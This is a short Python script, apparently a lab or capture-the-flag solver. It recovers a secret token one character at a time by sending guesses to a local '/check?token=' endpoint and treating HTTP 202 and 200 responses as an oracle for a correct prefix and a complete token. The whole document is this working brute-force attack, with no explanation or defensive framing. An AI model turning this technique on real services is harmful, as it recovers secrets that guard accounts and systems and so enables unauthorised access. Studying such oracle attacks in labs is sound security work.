#!/usr/bin/env python3
import urllib.error,urllib.parse,urllib.request
BASE='http://127.0.0.1:8091/check?token='
charset='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-'
prefix=''
while True:
 for c in charset:
  try:
   r=urllib.request.urlopen(BASE+urllib.parse.quote(prefix+c)); code=r.status; body=r.read().decode()
  except urllib.error.HTTPError as e: code=e.code; body=e.read().decode()
  if code in (200,202): prefix+=c; break
 else: raise RuntimeError('no valid next character')
 if code==200: print(prefix); break
